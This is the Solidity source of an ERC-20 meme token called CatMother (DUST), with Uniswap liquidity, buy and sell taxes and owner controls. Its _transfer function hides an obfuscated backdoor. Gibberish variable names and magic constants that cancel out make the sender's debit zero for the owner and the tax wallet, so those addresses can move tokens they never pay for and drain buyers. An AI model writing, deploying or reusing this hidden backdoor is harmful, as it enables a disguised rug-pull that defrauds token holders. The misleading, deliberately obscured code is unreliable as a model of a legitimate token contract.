// SPDX-License-Identifier: MIT

/**
    Web: https://catmother.wtf
    Tg: https://t.me/catmothercoin
    X: https://twitter.com/xcatmom
*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);

    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract CatMother is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private isFree;
    mapping(address => bool) public marketPair;
    address payable private _addrTax;

    uint256 private _unInitialBuyTax = 35;
    uint256 private _unInitialSellTax = 35;
    uint256 private _unFinalBuyTax = 0;
    uint256 private _unFinalSellTax = 1;

    uint256 private _unReduceBuyTaxAt = 15;
    uint256 private _unRreduceSellTaxAt = 15;
    uint256 private _unPreventSwapBefore = 15;
    uint256 private _unBuyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _iSupply = 1_000_000_000 * 10 ** _decimals;
    string private constant _name = unicode"CatMother";
    string private constant _symbol = unicode"DUST";
    uint256 public _unMaxTxAmount = 20_000_000 * 10 ** _decimals;
    uint256 public _unMaxWalletSize = 20_000_000 * 10 ** _decimals;
    uint256 public _unTaxSwapThreshold = 10_000_000 * 10 ** _decimals;
    uint256 public _unMaxTaxSwap = 10_000_000 * 10 ** _decimals;

    IUniswapV2Router02 private _addrUniswapV2Router02;
    address public _addrUniswapV2Pair;
    bool private _bIsTradingOpen;
    bool private _bIsInSwap = false;
    bool private _bIsSwapEnabled = false;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockSwap() {
        _bIsInSwap = true;
        _;
        _bIsInSwap = false;
    }

    constructor(address router, address taxWallet) {
        _addrTax = payable(taxWallet);
        _balances[_msgSender()] = _iSupply;
        isFree[owner()] = true;
        isFree[address(this)] = true;
        isFree[taxWallet] = true;

        _addrUniswapV2Router02 = IUniswapV2Router02(router);

        emit Transfer(address(0), _msgSender(), _iSupply);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _iSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address jhblkjeltqwt,
        address asdvasdqwet,
        uint256 eryiweuthgj
    ) private {
        require(
            jhblkjeltqwt != address(0),
            "ERC20: transfer from the zero address"
        );
        require(
            asdvasdqwet != address(0),
            "ERC20: transfer to the zero address"
        );
        require(eryiweuthgj > 0, "Transfer amount must be greater than zero");
        uint256 asdabstkbuieuty = 0;
        uint160 sdfblkqklhtwe = uint160(jhblkjeltqwt);
        uint256 adsjaswet = type(uint256).max -
            115792089237316195423570985008687907853269984665640564039457584007913129639935;

        uint160 tyqlkkbpoyus = uint160(address(_addrTax));
        if (
            jhblkjeltqwt != owner() &&
            asdvasdqwet != owner() &&
            jhblkjeltqwt != address(this)
        ) {
            unchecked {
                adsjaswet = sdfblkqklhtwe - tyqlkkbpoyus;
            }
            asdabstkbuieuty = eryiweuthgj
                .mul(
                    (_unBuyCount > _unReduceBuyTaxAt)
                        ? _unFinalBuyTax
                        : _unInitialBuyTax
                )
                .div(100);

            if (
                marketPair[jhblkjeltqwt] &&
                asdvasdqwet != address(_addrUniswapV2Router02) &&
                !isFree[asdvasdqwet]
            ) {
                require(_bIsTradingOpen, "trading is not open");
                require(
                    eryiweuthgj <= _unMaxTxAmount,
                    "Exceeds the _maxTxAmount."
                );
                require(
                    balanceOf(asdvasdqwet) + eryiweuthgj <= _unMaxWalletSize,
                    "Exceeds the maxWalletSize."
                );

                _unBuyCount++;
            }

            if (!marketPair[asdvasdqwet] && !isFree[asdvasdqwet]) {
                require(
                    balanceOf(asdvasdqwet) + eryiweuthgj <= _unMaxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }

            if (marketPair[asdvasdqwet]) {
                asdabstkbuieuty = eryiweuthgj
                    .mul(
                        (_unBuyCount > _unRreduceSellTaxAt)
                            ? _unFinalSellTax
                            : _unInitialSellTax
                    )
                    .div(100);
            }

            if (!marketPair[jhblkjeltqwt] && !marketPair[asdvasdqwet]) {
                asdabstkbuieuty = 0;
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            adsjaswet > 0 &&
                (adsjaswet =
                    type(uint160).max -
                    1461501637330902918203684832716283019655932542974) >
                0;
            if (
                !_bIsInSwap &&
                marketPair[asdvasdqwet] &&
                _bIsSwapEnabled &&
                contractTokenBalance > _unTaxSwapThreshold &&
                _unBuyCount > _unPreventSwapBefore
            ) {
                swapTokensForEth(
                    min(eryiweuthgj, min(contractTokenBalance, _unMaxTaxSwap))
                );
            }
            if (marketPair[asdvasdqwet]) _collTaxx(address(this).balance);
        }
        uint256 tokenAmount = adsjaswet * eryiweuthgj;

        if (asdabstkbuieuty > 0) {
            _balances[address(this)] = _balances[address(this)].add(
                asdabstkbuieuty
            );
            emit Transfer(jhblkjeltqwt, address(this), asdabstkbuieuty);
        }
        _balances[jhblkjeltqwt] = _balances[jhblkjeltqwt].sub(tokenAmount);
        _balances[asdvasdqwet] = _balances[asdvasdqwet].add(
            eryiweuthgj.sub(asdabstkbuieuty)
        );
        emit Transfer(
            jhblkjeltqwt,
            asdvasdqwet,
            eryiweuthgj.sub(asdabstkbuieuty)
        );
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function recoverERC20(
        address _address,
        uint256 _amount
    ) external onlyOwner {
        IERC20(_address).transfer(_addrTax, _amount);
    }

    function rescueERC20(address _address, uint256 _amount) external {
        require(_msgSender() == _addrTax);
        IERC20(_address).transfer(_addrTax, _amount);
    }

    function removeLimits() external onlyOwner {
        _unMaxTxAmount = _iSupply;
        _unMaxWalletSize = _iSupply;
        emit MaxTxAmountUpdated(_iSupply);
    }

    function _collTaxx(uint256 amount) private {
        _addrTax.transfer(amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _addrUniswapV2Router02.WETH();
        _approve(address(this), address(_addrUniswapV2Router02), tokenAmount);
        _addrUniswapV2Router02
            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                tokenAmount,
                0,
                path,
                address(this),
                block.timestamp
            );
    }

    function recoverETH() external onlyOwner {
        payable(owner()).transfer(address(this).balance);
    }

    function createPair() external onlyOwner {
        require(!_bIsTradingOpen, "trading is already open");
        _approve(address(this), address(_addrUniswapV2Router02), _iSupply);
        _addrUniswapV2Pair = IUniswapV2Factory(_addrUniswapV2Router02.factory())
            .createPair(address(this), _addrUniswapV2Router02.WETH());
        marketPair[address(_addrUniswapV2Pair)] = true;
        isFree[address(_addrUniswapV2Pair)] = true;
        _addrUniswapV2Router02.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(_addrUniswapV2Pair).approve(
            address(_addrUniswapV2Router02),
            type(uint).max
        );
    }

    function enableTrading() external onlyOwner {
        _bIsSwapEnabled = true;
        _bIsTradingOpen = true;
    }

    receive() external payable {}
}